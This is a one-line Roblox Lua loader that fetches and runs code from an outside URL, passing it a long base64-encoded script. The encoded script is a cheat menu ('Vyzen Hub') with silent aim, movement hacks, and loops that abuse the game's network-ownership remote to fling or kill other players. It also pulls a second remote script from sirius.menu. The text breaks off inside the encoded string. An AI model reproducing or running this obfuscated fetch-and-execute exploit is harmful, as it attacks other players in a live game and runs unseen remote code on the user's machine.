loadstring(game:HttpGet('https://roblox-obfuscator.vercel.app/api/script?c=bG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKbG9jYWwgSHR0cFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKbG9jYWwgUmVwbGljYXRlZFN0b3JhZ2UgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikKbG9jYWwgV29ya3NwYWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKQpsb2NhbCBVc2VySW5wdXRTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIikKbG9jYWwgUmVwbGljYXRlZEZpcnN0ID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkRmlyc3QiKQpsb2NhbCBUZXh0Q2hhdFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlRleHRDaGF0U2VydmljZSIpCmxvY2FsIERlYnJpcyA9IGdhbWU6R2V0U2VydmljZSgiRGVicmlzIikKCnRhc2sud2FpdCgxKQoKaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKZW5kCgpfRy5BY3R1YWxGYWtlR3JhYlBhcnRzID0gbmlsCl9HLlJlYWxHcmFiUGFydHMgPSBuaWwKX0cuUm90YXRpbmdGYWtlR3JhYlBhcnRzID0gZmFsc2UKX0cuVW5pdmVyc2FsUGxheWVyUm9vdCA9IG5pbApfRy5TaWxlbnRBaW1WMiA9IGZhbHNlCgpsb2NhbCBHcmFiRXZlbnRzID0gUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJHcmFiRXZlbnRzIikKbG9jYWwgQ2hhcmFjdGVyRXZlbnRzID0gUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJDaGFyYWN0ZXJFdmVudHMiKQpsb2NhbCBNZW51VG95cyA9IFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiTWVudVRveXMiKQoKbG9jYWwgU2V0TmV0d29ya093bmVyID0gR3JhYkV2ZW50czpXYWl0Rm9yQ2hpbGQoIlNldE5ldHdvcmtPd25lciIpCmxvY2FsIENyZWF0ZUdyYWJMaW5lID0gR3JhYkV2ZW50czpXYWl0Rm9yQ2hpbGQoIkNyZWF0ZUdyYWJMaW5lIikKbG9jYWwgRXh0ZW5kR3JhYkxpbmUgPSBHcmFiRXZlbnRzOldhaXRGb3JDaGlsZCgiRXh0ZW5kR3JhYkxpbmUiKQpsb2NhbCBEZXN0cm95R3JhYkxpbmUgPSBHcmFiRXZlbnRzOldhaXRGb3JDaGlsZCgiRGVzdHJveUdyYWJMaW5lIikKbG9jYWwgUmFnZG9sbFJlbW90ZSA9IENoYXJhY3RlckV2ZW50czpGaW5kRmlyc3RDaGlsZCgiUmFnZG9sbFJlbW90ZSIpCgpHcmFiRXZlbnRzLkVuZEdyYWJFYXJseS5PbkNsaWVudEV2ZW50OkNvbm5lY3QoZnVuY3Rpb24oKQogICAgaWYgX0cuQWN0dWFsRmFrZUdyYWJQYXJ0cyB0aGVuCiAgICAgICAgX0cuQWN0dWFsRmFrZUdyYWJQYXJ0czpEZXN0cm95KCkKICAgICAgICBfRy5BY3R1YWxGYWtlR3JhYlBhcnRzID0gbmlsCiAgICBlbmQKZW5kKQoKbG9jYWwgR3JhYlBhcnRzTW9kZWwgPSBSZXBsaWNhdGVkRmlyc3Q6V2FpdEZvckNoaWxkKCJHcmFiUGFydHMiKQoKbG9jYWwgbmVhcmVzdFBsYXllckluZm8gPSBuaWwKbG9jYWwgbWF4RGlzdGFuY2UgPSA0Nwpsb2NhbCB2YXIxMjBfdXB2dyA9IG5pbAoKZ2V0Z2VudigpLlNldHRpbmdzID0gZ2V0Z2VudigpLlNldHRpbmdzIG9yIHsKICAgIEZvdiA9IDI1MCwKICAgIEhpdGJveCA9IHsiSGVhZCIsICJIdW1hbm9pZFJvb3RQYXJ0In0KfQoKbG9jYWwgU2hhcmVkU2V0dGluZ3MgPSB7CiAgICBUYXJnZXRMaXN0ID0ge30sCiAgICBCbG9ibWFuRGVsYXkgPSA1ZS04LAogICAgRGVhdGhfQXVyYSA9IGZhbHNlLAogICAgV2Fsa3NwZWVkID0gZmFsc2UsCiAgICBXYWxrc3BlZWRWYWx1ZSA9IDUsCiAgICBJbmZpbml0ZUp1bXAgPSBmYWxzZSwKICAgIEluZmluaXRlSnVtcFBvd2VyID0gMTAwLAogICAgTm9jbGlwID0gZmFsc2UsCiAgICBDb25uZWN0aW9ucyA9IHt9Cn0KCi0tIExvb3AgYXR0YWNrIHNldHRpbmdzCmxvY2FsIGF0dGFja1RhcmdldHMgPSB7fQpsb2NhbCBzZWxlY3RlZFRhcmdldCA9IG5pbApsb2NhbCBsb29wS2lja1NldHRpbmdzID0ge0UgPSBmYWxzZSwgRCA9IDAuNX0KbG9jYWwgbG9vcEtpbGxTZXR0aW5ncyA9IHtFID0gZmFsc2UsIEQgPSAwLjV9CmxvY2FsIGxvb3BLaWNrQ29ubiwgbG9vcEtpbGxDb25uID0gbmlsLCBuaWwKCmxvY2FsIGZ1bmN0aW9uIGdldEFsbFBsYXllcnMoKQogICAgbG9jYWwgcGxheWVyTGlzdCA9IHt9CiAgICBmb3IgXywgcGxheWVyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgICAgICB0YWJsZS5pbnNlcnQocGxheWVyTGlzdCwgcGxheWVyLk5hbWUpCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHJldHVybiBwbGF5ZXJMaXN0CmVuZAoKbG9jYWwgZnVuY3Rpb24gaXNJblBsb3QocGxheWVyKQogICAgbG9jYWwgaW5QbG90ID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJJblBsb3QiKQogICAgcmV0dXJuIGluUGxvdCBhbmQgaW5QbG90LlZhbHVlID09IHRydWUKZW5kCgpsb2NhbCBmdW5jdGlvbiBub2NvbGwobW9kZWwpCiAgICBmb3IgXywgcGFydCBpbiBpcGFpcnMobW9kZWw6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICBpZiBwYXJ0OklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgIHBhcnQuQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBmbGluZyhwYXJ0LCBodW1hbm9pZCkKICAgIG5vY29sbChodW1hbm9pZC5QYXJlbnQpCiAgICBsb2NhbCBidiA9IEluc3RhbmNlLm5ldygiQm9keVZlbG9jaXR5IiwgcGFydCkKICAgIGJ2Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKICAgIGJ2LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwgMTAwMDAwMDAwMCwgMCkKICAgIGh1bWFub2lkLkp1bXAgPSB0cnVlCiAgICBodW1hbm9pZC5TaXQgPSBmYWxzZQogICAgdGFzay5kZWxheSgzLCBmdW5jdGlvbigpCiAgICAgICAgaWYgYnYuUGFyZW50IHRoZW4gYnY6RGVzdHJveSgpIGVuZAogICAgZW5kKQplbmQKCi0tIEZJWEVEOiBhdHRhY2tQbGF5ZXJWMiB3aXRoIHByb3BlciBhbGl2ZSBjaGVja3MKbG9jYWwgZnVuY3Rpb24gYXR0YWNrUGxheWVyVjIodGFyZ2V0UGxheWVyLCBraWxsTW9kZSkKICAgIGlmIG5vdCB0YXJnZXRQbGF5ZXIgb3Igbm90IHRhcmdldFBsYXllci5DaGFyYWN0ZXIgdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICAKICAgIGlmIGlzSW5QbG90KHRhcmdldFBsYXllcikgdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICAKICAgIGxvY2FsIHRhcmdldENoYXIgPSB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyCiAgICBsb2NhbCB0YXJnZXRSb290ID0gdGFyZ2V0Q2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBsb2NhbCB0YXJnZXRIdW1hbm9pZCA9IHRhcmdldENoYXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICBsb2NhbCB0YXJnZXRIZWFkID0gdGFyZ2V0Q2hhcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpCiAgICAKICAgIGlmIG5vdCB0YXJnZXRSb290IG9yIG5vdCB0YXJnZXRIdW1hbm9pZCBvciBub3QgdGFyZ2V0SGVhZCB0aGVuIHJldHVybiBmYWxzZSBlbmQKICAgIGlmIHRhcmdldEh1bWFub2lkLkhlYWx0aCA8PSAwIHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAgCiAgICBsb2NhbCBteUNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGxvY2FsIG15Um9vdCA9IG15Q2hhciBhbmQgbXlDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGxvY2FsIG15SHVtYW5vaWQgPSBteUNoYXIgYW5kIG15Q2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgIAogICAgLS0gRklYOiBDaGVjayBpZiBZT1UgYXJlIGFsaXZlCiAgICBpZiBub3QgbXlSb290IG9yIG5vdCBteUh1bWFub2lkIHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAgaWYgbXlIdW1hbm9pZC5IZWFsdGggPD0gMCB0aGVuIHJldHVybiBmYWxzZSBlbmQKICAgIAogICAgbG9jYWwgb3JpZ2luYWxQb3NpdGlvbiA9IG15Um9vdC5DRnJhbWUKICAgIAogICAgbG9jYWwgc3VjY2VzcyA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBteUNoYXI6UGl2b3RUbyh0YXJnZXRSb290LkNGcmFtZSAqIENGcmFtZS5uZXcoNSwgLTE4LjUsIDApKQogICAgICAgIG5vY29sbCh0YXJnZXRDaGFyKQogICAgICAgIAogICAgICAgIGxvY2FsIGF0dGVtcHRzID0gMAogICAgICAgIGxvY2FsIGdvdE93bmVyc2hpcCA9IGZhbHNlCiAgICAgICAgCiAgICAgICAgcmVwZWF0CiAgICAgICAgICAgIC0tIEZJWDogQ2hlY2sgaWYgeW91J3JlIHN0aWxsIGFsaXZlIGR1cmluZyBhdHRlbXB0cwogICAgICAgICAgICBpZiBub3QgbXlSb290IG9yIG5vdCBteVJvb3QuUGFyZW50IG9yIG5vdCBteUh1bWFub2lkIG9yIG15SHVtYW5vaWQuSGVhbHRoIDw9IDAgdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgU2V0TmV0d29ya093bmVyOkZpcmVTZXJ2ZXIodGFyZ2V0Um9vdCwgbXlSb290LkNGcmFtZSkKICAgICAgICAgICAgdGFzay53YWl0KDAuMTUpCiAgICAgICAgICAgIGF0dGVtcHRzID0gYXR0ZW1wdHMgKyAxCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiB0YXJnZXRIZWFkOkZpbmRGaXJzdENoaWxkKCJQYXJ0T3duZXIiKSBhbmQgdGFyZ2V0SGVhZC5QYXJ0T3duZXIuVmFsdWUgPT0gTG9jYWxQbGF5ZXIuTmFtZSB0aGVuCiAgICAgICAgICAgICAgICBnb3RPd25lcnNoaXAgPSB0cnVlCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbmQKICAgICAgICB1bnRpbCBhdHRlbXB0cyA+IDE1CiAgICAgICAgCiAgICAgICAgLS0gRklYOiBDaGVjayBpZiB5b3UncmUgc3RpbGwgYWxpdmUgYmVmb3JlIHRlbGVwb3J0aW5nIGJhY2sKICAgICAgICBpZiBteVJvb3QgYW5kIG15Um9vdC5QYXJlbnQgYW5kIG15SHVtYW5vaWQgYW5kIG15SHVtYW5vaWQuSGVhbHRoID4gMCB0aGVuCiAgICAgICAgICAgIG15Um9vdC5DRnJhbWUgPSBvcmlnaW5hbFBvc2l0aW9uCiAgICAgICAgICAgIG15Um9vdC5Bc3NlbWJseUxpbmVhclZlbG9jaXR5ID0gVmVjdG9yMy56ZXJvCiAgICAgICAgICAgIG15Um9vdC5Bc3NlbWJseUFuZ3VsYXJWZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGlmIGdvdE93bmVyc2hpcCB0aGVuCiAgICAgICAgICAgIGlmIGtpbGxNb2RlIHRoZW4KICAgICAgICAgICAgICAgIHRhcmdldEh1bWFub2lkLkhlYWx0aCA9IDAKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgZmxpbmcodGFyZ2V0Um9vdCwgdGFyZ2V0SHVtYW5vaWQpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgRGVzdHJveUdyYWJMaW5lOkZpcmVTZXJ2ZXIodGFyZ2V0Um9vdCkKICAgICAgICBlbmQKICAgIGVuZCkKICAgIAogICAgLS0gRklYOiBPbmx5IHRlbGVwb3J0IGJhY2sgaWYgeW91J3JlIHN0aWxsIGFsaXZlCiAgICBpZiBteVJvb3QgYW5kIG15Um9vdC5QYXJlbnQgYW5kIG15SHVtYW5vaWQgYW5kIG15SHVtYW5vaWQuSGVhbHRoID4gMCB0aGVuCiAgICAgICAgbXlSb290LkNGcmFtZSA9IG9yaWdpbmFsUG9zaXRpb24KICAgICAgICBteVJvb3QuQXNzZW1ibHlMaW5lYXJWZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgIG15Um9vdC5Bc3NlbWJseUFuZ3VsYXJWZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgZW5kCiAgICAKICAgIHJldHVybiBzdWNjZXNzCmVuZAoKbG9jYWwgZnVuY3Rpb24gbG9vcEF0dGFjayhzZXR0aW5ncywga2lsbE1vZGUpCiAgICBmb3IgdGFyZ2V0TmFtZSwgXyBpbiBwYWlycyhhdHRhY2tUYXJnZXRzKSBkbwogICAgICAgIGlmIG5vdCBzZXR0aW5ncy5FIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgdGFyZ2V0ID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZCh0YXJnZXROYW1lKQogICAgICAgIGlmIHRhcmdldCBhbmQgbm90IGlzSW5QbG90KHRhcmdldCkgdGhlbgogICAgICAgICAgICBhdHRhY2tQbGF5ZXJWMih0YXJnZXQsIGtpbGxNb2RlKQogICAgICAgICAgICB0YXNrLndhaXQoc2V0dGluZ3MuRCkKICAgICAgICBlbmQKICAgIGVuZAplbmQKCi0tIEZJWEVEOiBsb29wQ3RybCB3aXRoIGNoYXJhY3RlciBleGlzdGVuY2UgY2hlY2sKbG9jYWwgZnVuY3Rpb24gbG9vcEN0cmwoc2V0dGluZ3MsIGtpbGxNb2RlKQogICAgcmV0dXJuIFJ1blNlcnZpY2UuSGVhcnRiZWF0OkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgIGlmIHNldHRpbmdzLkUgdGhlbgogICAgICAgICAgICAtLSBGSVg6IE9ubHkgcnVuIGlmIHlvdSdyZSBhbGl2ZQogICAgICAgICAgICBsb2NhbCBjaGFyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGxvY2FsIGh1bWFub2lkID0gY2hhciBhbmQgY2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICAgICAgaWYgY2hhciBhbmQgaHVtYW5vaWQgYW5kIGh1bWFub2lkLkhlYWx0aCA+IDAgdGhlbgogICAgICAgICAgICAgICAgbG9vcEF0dGFjayhzZXR0aW5ncywga2lsbE1vZGUpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQplbmQKCmxvY2FsIGZ1bmN0aW9uIHN0b3BMb29wKGNvbm4sIHNldHRpbmdzKQogICAgc2V0dGluZ3MuRSA9IGZhbHNlCiAgICBpZiBjb25uIHRoZW4KICAgICAgICBjb25uOkRpc2Nvbm5lY3QoKQogICAgZW5kCmVuZAoKLS0gRklYRUQ6IENoYXJhY3RlciBkZWF0aCBhbmQgcmVzcGF3biBoYW5kbGluZwpsb2NhbCBmdW5jdGlvbiBzZXR1cENoYXJhY3RlckNvbm5lY3Rpb25zKCkKICAgIGxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3IgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICBsb2NhbCBodW1hbm9pZCA9IGNoYXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIpCiAgICAKICAgIC0tIFJlc2V0IGNvbm5lY3Rpb25zIHdoZW4gY2hhcmFjdGVyIGRpZXMKICAgIGh1bWFub2lkLkRpZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgLS0gU3RvcCBhbnkgcnVubmluZyBsb29wcwogICAgICAgIGlmIGxvb3BLaWNrQ29ubiB0aGVuCiAgICAgICAgICAgIGxvb3BLaWNrQ29ubjpEaXNjb25uZWN0KCkKICAgICAgICAgICAgbG9vcEtpY2tDb25uID0gbmlsCiAgICAgICAgZW5kCiAgICAgICAgaWYgbG9vcEtpbGxDb25uIHRoZW4KICAgICAgICAgICAgbG9vcEtpbGxDb25uOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICBsb29wS2lsbENvbm4gPSBuaWwKICAgICAgICBlbmQKICAgIGVuZCkKZW5kCgotLSBDYWxsIGl0IHdoZW4gdGhlIHNjcmlwdCBsb2FkcwpzZXR1cENoYXJhY3RlckNvbm5lY3Rpb25zKCkKCi0tIEZJWEVEOiBSZWNvbm5lY3Qgd2hlbiBjaGFyYWN0ZXIgcmVzcGF3bnMKTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICB0YXNrLndhaXQoMC41KSAtLSBXYWl0IGZvciBjaGFyYWN0ZXIgdG8gZnVsbHkgbG9hZAogICAgc2V0dXBDaGFyYWN0ZXJDb25uZWN0aW9ucygpCiAgICAKICAgIC0tIElmIGtpY2sva2lsbCBsb29wcyB3ZXJlIGFjdGl2ZSwgcmVzdGFydCB0aGVtCiAgICBpZiBsb29wS2lja1NldHRpbmdzLkUgdGhlbgogICAgICAgIGlmIGxvb3BLaWNrQ29ubiB0aGVuCiAgICAgICAgICAgIGxvb3BLaWNrQ29ubjpEaXNjb25uZWN0KCkKICAgICAgICBlbmQKICAgICAgICBsb29wS2lja0Nvbm4gPSBsb29wQ3RybChsb29wS2lja1NldHRpbmdzLCBmYWxzZSkKICAgIGVuZAogICAgaWYgbG9vcEtpbGxTZXR0aW5ncy5FIHRoZW4KICAgICAgICBpZiBsb29wS2lsbENvbm4gdGhlbgogICAgICAgICAgICBsb29wS2lsbENvbm46RGlzY29ubmVjdCgpCiAgICAgICAgZW5kCiAgICAgICAgbG9vcEtpbGxDb25uID0gbG9vcEN0cmwobG9vcEtpbGxTZXR0aW5ncywgdHJ1ZSkKICAgIGVuZAplbmQpCgpsb2NhbCBSYXlmaWVsZCA9IGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCdodHRwczovL3Npcml1cy5tZW51L3JheWZpZWxkJykpKCkKCmxvY2FsIFJlZFRoZW1lID0gewogICAgVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjQwLCAyNDAsIDI0MCksCiAgICBCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMTUsIDE1LCAxNSksCiAgICBUb3BiYXIgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDIwKSwKICAgIFNoYWRvdyA9IENvbG9yMy5mcm9tUkdCKDEwLCAxMCwgMTApLAogICAgTm90aWZpY2F0aW9uQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMjApLAogICAgTm90aWZpY2F0aW9uQWN0aW9uc0JhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigyMzAsIDIzMCwgMjMwKSwKICAgIFRhYkJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigyNSwgMjUsIDI1KSwKICAgIFRhYlN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgNTAsIDUwKSwKICAgIFRhYkJhY2tncm91bmRTZWxlY3RlZCA9IENvbG9yMy5mcm9tUkdCKDM1LCAzNSwgMzUpLAogICAgVGFiVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMDAsIDIwMCksCiAgICBTZWxlY3RlZFRhYlRleHRDb2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgNTAsIDUwKSwKICAgIEVsZW1lbnRCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksCiAgICBFbGVtZW50QmFja2dyb3VuZEhvdmVyID0gQ29sb3IzLmZyb21SR0IoMTAsIDEwLCAxMCksCiAgICBTZWNvbmRhcnlFbGVtZW50QmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApLAogICAgRWxlbWVudFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgNTAsIDUwKSwKICAgIFNlY29uZGFyeUVsZW1lbnRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDMwLCAzMCksCiAgICBTbGlkZXJCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksCiAgICBTbGlkZXJQcm9ncmVzcyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgNTAsIDUwKSwKICAgIFNsaWRlclN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgODAsIDgwKSwKICAgIFRvZ2dsZUJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKSwKICAgIFRvZ2dsZUVuYWJsZWQgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDUwLCA1MCksCiAgICBUb2dnbGVEaXNhYmxlZCA9IENvbG9yMy5mcm9tUkdCKDYwLCA2MCwgNjApLAogICAgVG9nZ2xlRW5hYmxlZFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgODAsIDgwKSwKICAgIFRvZ2dsZURpc2FibGVkU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoODAsIDgwLCA4MCksCiAgICBUb2dnbGVFbmFibGVkT3V0ZXJTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDQwLCA0MCksCiAgICBUb2dnbGVEaXNhYmxlZE91dGVyU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoNTAsIDUwLCA1MCksCiAgICBEcm9wZG93blNlbGVjdGVkID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksCiAgICBEcm9wZG93blVuc2VsZWN0ZWQgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKSwKICAgIElucHV0QmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApLAogICAgSW5wdXRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDUwLCA1MCksCiAgICBQbGFjZWhvbGRlckNvbG9yID0gQ29sb3IzLmZyb21SR0IoMTUwLCAxNTAsIDE1MCkKfQoKdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICB0YXNrLndhaXQoMSkKICAgIGxvY2FsIFBsYXllckd1aSA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLlBsYXllckd1aQogICAgbG9jYWwgUmF5ZmllbGRHdWkgPSBQbGF5ZXJHdWk6V2FpdEZvckNoaWxkKCJSYXlmaWVsZCIpCiAgICBsb2NhbCBNYWluID0gUmF5ZmllbGRHdWk6V2FpdEZvckNoaWxkKCJNYWluIikKICAgIE1haW4uU2l6ZSA9IFVEaW0yLm5ldygwLCA1ODksIDAsIDM3MikKICAgIE1haW4uVG9wYmFyLlNpemUgPSBVRGltMi5uZXcoMCwgNTg5LCAwLCA0NSkKZW5kKQoKbG9jYWwgV2luZG93ID0gUmF5ZmllbGQ6Q3JlYXRlV2luZG93KHsKICAgTmFtZSA9ICJWeXplbiBIdWIiLAogICBMb2FkaW5nVGl0bGUgPSAiVnl6ZW4iLAogICBMb2FkaW5nU3VidGl0bGUgPSAiYnkgVnl6ZW4iLAogICBDb25maWd1cmF0aW9uU2F2aW5nID0gewogICAgICBFbmFibGVkID0gdHJ1ZSwKICAgICAgRm9sZGVyTmFtZSA9IG5pbCwKICAgICAgRmlsZU5hbWUgPSAiVnl6ZW5Db25maWciCiAgIH0sCiAgIERpc2NvcmQgPSB7CiAgICAgIEVuYWJsZWQgPSBmYWxzZQogICB9LAogICBLZXlTeXN0ZW0gPSBmYWxzZSwKICAgVGhlbWUgPSBSZWRUaGVtZQp9KQoKbG9jYWwgQ29tYmF0VGFiID0gV2luZG93OkNyZWF0ZVRhYigiU2lsZW50IEFpbSIsIDQ0ODMzNjI0NTgpCmxvY2FsIFBsYXllclRhYiA9IFdpbmRvdzpDcmVhdGVUYWIoIlBsYXllciIsIDQ0ODMzNjI0NTgpCmxvY2FsIEludmluY2liaWxpdHlUYWIgPSBXaW5kb3c6Q3JlYXRlVGFiKCJQcm90ZWN0aW9uIiwgNDQ4MzM2MjQ1OCkKbG9jYWwgQXR0YWNrVGFiID0gV2luZG93OkNyZWF0ZVRhYigiQXR0YWNrIiwgNDQ4MzM2MjQ1OCkKbG9jYWwgQmxvYm1hblRhYiA9IFdpbmRvdzpDcmVhdGVUYWIoIkJsb2JtYW4iLCA0NDgzMzYyNDU4KQpsb2NhbCBBdXJhc1RhYiA9IFdpbmRvdzpDcmVhdGVUYWIoIkF1cmFzIiwgNDQ4MzM2MjQ1OCkKbG9jYWwgVGVsZXBvcnRUYWIgPSBXaW5kb3c6Q3JlYXRlVGFiKCJUZWxlcG9ydCIsIDQ0ODMzNjI0NTgpCmxvY2FsIFJhbmRvbVRhYiA9IFdpbmRvdzpDcmVhdGVUYWIoIkV4dHJhcyIsIDQ0ODMzNjI0NTgpCmxvY2FsIENyZWRpdHNUYWIgPSBXaW5kb3c6Q3JlYXRlVGFiKCJDcmVkaXRzIiwgNDQ4MzM2MjQ1OCkKClJheWZpZWxkOk5vdGlmeSh7CiAgIFRpdGxlID0gIlZ5emVuIEh1YiIsCiAgIENvbnRlbnQgPSAiTG9hZGVkIHN1Y2Nlc3NmdWxseSAtIEZJWEVEIFZFUlNJT04iLAogICBEdXJhdGlvbiA9IDQsCiAgIEltYWdlID0gNDQ4MzM2MjQ1OCwKfSkKCi0tIElNUFJPVkVEOiBpc1BsYXllckluRk9WIGZ1bmN0aW9uIHdpdGggYmV0dGVyIEZPViBjaGVja2luZwpsb2NhbCBmdW5jdGlvbiBpc1BsYXllckluRk9WKHBsYXllciwgZm92UmFkaXVzKQogICAgaWYgbm90IHBsYXllciBvciBub3QgcGxheWVyLkNoYXJhY3RlciB0aGVuIHJldHVybiBmYWxzZSBlbmQKICAgIAogICAgbG9jYWwgdGFyZ2V0Um9vdCA9IHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgbG9jYWwgdGFyZ2V0SHVtYW5vaWQgPSBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgCiAgICBpZiBub3QgdGFyZ2V0Um9vdCBvciBub3QgdGFyZ2V0SHVtYW5vaWQgb3IgdGFyZ2V0SHVtYW5vaWQuSGVhbHRoIDw9IDAgdGhlbgogICAgICAgIHJldHVybiBmYWxzZQogICAgZW5kCiAgICAKICAgIGxvY2FsIG15Q2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgbG9jYWwgbXlSb290ID0gbXlDaGFyIGFuZCBteUNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgCiAgICBpZiBub3QgbXlSb290IHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAgCiAgICAtLSBDaGVjayAzRCBkaXN0YW5jZSBmaXJzdCAocmVhY2ggY2hlY2spCiAgICBsb2NhbCBkaXN0YW5jZTNEID0gKG15Um9vdC5Qb3NpdGlvbiAtIHRhcmdldFJvb3QuUG9zaXRpb24pLk1hZ25pdHVkZQogICAgaWYgZGlzdGFuY2UzRCA+IG1heERpc3RhbmNlIHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAgCiAgICBsb2NhbCBjYW1lcmEgPSBXb3Jrc3BhY2UuQ3VycmVudENhbWVyYQogICAgbG9jYWwgc2NyZWVuUG9pbnQsIG9uU2NyZWVuID0gY2FtZXJhOldvcmxkVG9W